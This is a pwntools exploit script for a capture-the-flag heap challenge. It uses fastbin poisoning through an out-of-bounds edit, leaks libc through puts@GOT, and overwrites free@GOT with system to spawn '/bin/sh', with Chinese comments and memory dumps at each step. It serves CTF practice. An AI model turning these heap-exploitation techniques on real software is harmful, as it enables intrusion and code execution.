from pwn import *
from pwn import *
import re

txt = "challenge-cb8064c4abe6c8f3.sandbox.ctfhub.com 39041"
host, port = re.split(r':| ', txt)
# s = remote(host, port)
s = process('./pwn')
context(log_level='debug', arch='amd64', os='linux')
elf = ELF("./pwn")


def add():
    s.sendlineafter(b'>>', b"1")


def free(idx):
    s.sendlineafter(b'>> ', b"2")
    s.sendlineafter(b"Index:", str(idx))


def show(idx):
    s.sendlineafter(b'>> ', b"3")
    s.sendlineafter(b"Index:", str(idx))


def edit(idx, size, data):
    s.sendlineafter(b'>> ', b"4")
    s.sendlineafter(b"Index:", str(idx))
    s.sendlineafter(b"Size:", str(size))
    s.sendafter(b"Content:", data)


add()  # 0
add()  # 1
add()  # 2
"""
可以看到若chunk->fd=0x60209d时，size字段为0x7f, 于我们申请的heap为0x60，加上字段后为0x70，最终的fastbins大小分类一致，可用作构造FakeChunk
+0020 0x60209d  00 00 00 40 f5 d5 02 2c  7f 00 00 00 00 00 00 00  │...@...,│........│
+0030 0x6020ad  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  │........│........│ 这里最好是00防止其他fd,bk产生的问题
"""
fake_chunk = 0x6020a5 - 0x8  # 0x60209d
free(1)  # del 1
edit(0, -1, b"a" * 0x60 + p64(0) + p64(0x71) + p64(fake_chunk))  # fastbins: 0x70: 0xf6f070 —▸ 0x60207d ◂— 0x2c02d5e8e0000000
add()  # (1) 0xf6f070
add()  # (3) 0x60207d
free_got = elf.got['free']
puts_got = elf.got['puts']

edit(3, -1, b"a" * 3 + p64(puts_got) * 3)
"""
+0000 0x60209d  00 00 00 40 15 b2 23 e5  7f 00 00 00 00 00 00 00  │...@..#.│........│
+0010 0x6020ad  61 61 61 20 20 60 00 00  00 00 00 20 20 60 00 00  |aaa.....|........|
+0020 0x6020bd  00 00 00 20 20 60 00 00  00 00 00 80 80 f0 00 00  # 这时 heap[0] 0x6020c0已被改为 20 20 60 00 即 puts_got
"""
show(0)  # 即show 0x602020即 show(puts_got)
# gdb.attach(s)

puts_addr = s.recvuntil(b"\x7f")[-6:]
puts_addr = u64(puts_addr.ljust(8, b"\x00"))

# libc = ELF("libc-2.23.so")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc.address = puts_addr - libc.sym["puts"]
system_addr = libc.sym["system"]

success("puts_addr------------>: " + hex(puts_addr))
success("system_addr---------->: " + hex(system_addr))

edit(3, -1, b"a" * 3 + p64(free_got) * 3)
add()
edit(4, 8, b"/bin/sh\x00")  # 0x60209d 写入 /bin/sh
edit(0, 8, p64(system_addr))
free(4)  # free已被替换为 system 相当于 system(chunk[4]) 即 system(/bin/sh)

s.interactive()
